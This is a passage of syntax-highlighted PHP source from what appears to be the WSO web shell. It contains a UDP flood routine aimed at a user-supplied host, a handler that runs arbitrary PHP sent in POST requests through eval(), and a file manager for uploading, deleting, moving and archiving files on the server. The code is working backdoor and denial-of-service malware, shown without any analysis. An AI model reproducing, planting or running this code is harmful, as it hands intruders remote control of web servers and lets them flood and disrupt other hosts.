            <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="s1">&#39;udp://&#39;</span><span class="o">.</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$rand</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">){</span>
                    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
                    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;UDP Flood&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Completed with </span><span class="si">$pakits</span><span class="s2"> (&quot;</span> <span class="o">.</span> <span class="nb">round</span><span class="p">((</span><span class="nv">$pakits</span><span class="o">*</span><span class="mi">65</span><span class="p">)</span><span class="o">/</span><span class="mi">1024</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; MB) packets averaging &quot;</span><span class="o">.</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$pakits</span><span class="o">/</span><span class="nv">$exec_time</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; packets per second </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">       &amp;lt;form action=&quot;&#39;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s1">&#39;&quot; method=POST&amp;gt;</span>
<span class="s1">       &amp;lt;input type=&quot;hidden&quot; name=&quot;a&quot; value=&quot;phptools&quot;&amp;gt;</span>
<span class="s1">       Host: &amp;lt;input type=text name=host value=localhost&amp;gt;</span>
<span class="s1">       Length (seconds): &amp;lt;input type=text name=time value=9999&amp;gt;</span>
<span class="s1">       &amp;lt;input type=submit value=Go&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span> <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;UDP Flood&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">           &amp;lt;form action=? method=POST&amp;gt;</span>
<span class="s1">           &amp;lt;input type=&quot;hidden&quot; name=&quot;a&quot; value=&quot;phptools&quot;&amp;gt;</span>
<span class="s1">           Host: &amp;lt;br&amp;gt;&amp;lt;input type=text name=host value=localhost&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">           Length (seconds): &amp;lt;br&amp;gt;&amp;lt;input type=text name=time value=9999&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">           &amp;lt;input type=submit value=Go&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x">&amp;lt;/center&amp;gt;</span><span class="cp">&lt;?php</span>
<span class="nx">wsoFooter</span><span class="p">();}</span>
<span class="k">function</span> <span class="nf">actionPhp</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;PhpOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;PhpOutput&#39;).innerHTML=&#39;&quot;</span> <span class="o">.</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span> <span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;info&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;PHP info&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;style&amp;gt;.p {color:#000;}&amp;lt;/style&amp;gt;&#39;</span><span class="p">;</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="nb">phpinfo</span><span class="p">();</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!td, th {(.*)}!msiU&#39;</span><span class="p">,</span><span class="s1">&#39;.e, .v, .h, .h th {$1}&#39;</span><span class="p">,</span><span class="nv">$tmp</span><span class="p">);</span>
        <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h1&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;lt;h2&#39;</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Execution PHP-code&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;form name=pf method=post onsubmit=&quot;if(this.ajax.checked){a(\&#39;Php\&#39;,null,this.code.value);}else{g(\&#39;Php\&#39;,null,this.code.value,\&#39;\&#39;);}return false;&quot;&amp;gt;&amp;lt;textarea name=code class=bigarea id=PhpCode&amp;gt;&#39;</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;input type=submit value=Eval style=&quot;margin-top:5px&quot;&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39; &amp;lt;input type=checkbox name=ajax value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt; send using AJAX&amp;lt;/form&amp;gt;&amp;lt;pre id=PhpOutput style=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;margin-top:5px;&quot; class=ml1&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
        <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">());</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionFilesMan</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;File manager&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;script&amp;gt;p1_=p2_=p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="s1">&#39;uploadFile&#39;</span><span class="o">:</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span>
                    <span class="k">echo</span> <span class="s2">&quot;Can&#39;t upload file!&quot;</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s1">&#39;mkdir&#39;</span><span class="o">:</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span>
                    <span class="k">echo</span> <span class="s2">&quot;Can&#39;t create new dir&quot;</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s1">&#39;delete&#39;</span><span class="o">:</span>
                <span class="k">function</span> <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$path</span> <span class="o">=</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$path</span><span class="o">:</span><span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
                    <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
                    <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">.</span><span class="nv">$item</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">)</span>
                            <span class="k">continue</span><span class="p">;</span>
                        <span class="nv">$type</span> <span class="o">=</span> <span class="nb">filetype</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s2">&quot;dir&quot;</span><span class="p">)</span>
                            <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                        <span class="k">else</span>
                            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
                    <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="o">==</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span>
                            <span class="k">continue</span><span class="p">;</span>
                        <span class="nv">$f</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
                            <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                        <span class="k">else</span>
                            <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="s1">&#39;paste&#39;</span><span class="o">:</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;copy&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">function</span> <span class="nf">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$d</span><span class="p">){</span>
                        <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">)){</span>
                            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                            <span class="nv">$h</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                            <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
                                <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span>
                                    <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
                        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">))</span>
                            <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span>
                        <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">],</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;move&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">function</span> <span class="nf">move_paste</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$d</span><span class="p">){</span>
                        <span class="k">if</span><span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">)){</span>
                            <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                            <span class="nv">$h</span> <span class="o">=</span> <span class="o">@</span><span class="nb">opendir</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                            <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="o">@</span><span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
                                <span class="k">if</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span>
                                    <span class="nx">copy_paste</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
                        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">))</span>
                            <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span>
                        <span class="o">@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;zip&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">open</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
                            <span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
                            <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
                                <span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="o">==</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span>
                                    <span class="k">continue</span><span class="p">;</span>
                                <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span>
                                    <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">addFile</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$f</span><span class="p">);</span>
                                <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
                                    <span class="nv">$iterator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">RecursiveIteratorIterator</span><span class="p">(</span><span class="k">new</span> <span class="nx">RecursiveDirectoryIterator</span><span class="p">(</span><span class="nv">$f</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">));</span>
                                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">addFile</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$key</span><span class="p">),</span> <span class="nv">$key</span><span class="p">);</span>
                                    <span class="p">}</span>
                                <span class="p">}</span>
                            <span class="p">}</span>
                            <span class="nb">chdir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
                            <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">close</span><span class="p">();</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;unzip&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">open</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
                                <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">extractTo</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
                                <span class="nv">$zip</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">close</span><span class="p">();</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;tar&#39;</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;escapeshellarg&#39;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]);</span>
                    <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;tar cfzv &#39;</span> <span class="o">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]));</span>
                    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
                <span class="p">}</span>
                <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">];</span>
                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
